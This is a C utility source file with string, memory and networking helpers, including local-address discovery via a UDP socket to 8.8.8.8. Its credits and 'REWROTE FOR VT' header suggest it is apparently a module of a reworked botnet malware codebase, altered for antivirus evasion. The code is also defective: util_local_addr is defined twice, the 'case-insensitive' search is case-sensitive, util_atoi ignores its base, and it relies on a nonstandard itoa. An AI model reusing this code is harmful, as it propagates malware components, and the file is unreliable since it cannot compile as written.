// Rewritten by Queered for Nipzy

/*
REWROTE FOR VT
*/

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "includes.h"
#include "table.h"
#include "util.h"

int util_strlen(const char *str) {
    return strlen(str);
}

BOOL util_strncmp(const char *str1, const char *str2, size_t len) {
    return strncmp(str1, str2, len) == 0;
}

BOOL util_strcmp(const char *str1, const char *str2) {
    return strcmp(str1, str2) == 0;
}

int util_strcpy(char *dst, const char *src) {
    size_t l = strlen(src);
    strcpy(dst, src);
    return l;
}

void util_memcpy(void *dst, const void *src, size_t len) {
    memcpy(dst, src, len);
}

void util_zero(void *buf, size_t len) {
    memset(buf, 0, len);
}

int util_atoi(const char *str, int base) {
    return atoi(str);
}

char *util_itoa(int value, int radix, char *string) {
    return itoa(value, string, radix);
}

int util_memsearch(const char *buf, size_t buf_len, const char *mem, size_t mem_len) {
    if (mem_len > buf_len) {
        return -1;
    }

    const char *end = buf + buf_len - mem_len + 1;
    for (const char *p = buf; p < end; ++p) {
        if (memcmp(p, mem, mem_len) == 0) {
            return p - buf;
        }
    }

    return -1;
}

char *util_stristr(const char *haystack, const char *needle) {
    const size_t needle_len = strlen(needle);

    if (needle_len == 0)
        return (char *)haystack;

    for (; (haystack = strchr(haystack, needle[0])); haystack++) {
        if (strncmp(haystack, needle, needle_len) == 0)
            return (char *)haystack;
    }

    return NULL;
}

static inline ipv4_t util_local_addr(void) {
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

static inline char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

static inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

static inline int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

static inline int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

static inline ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}
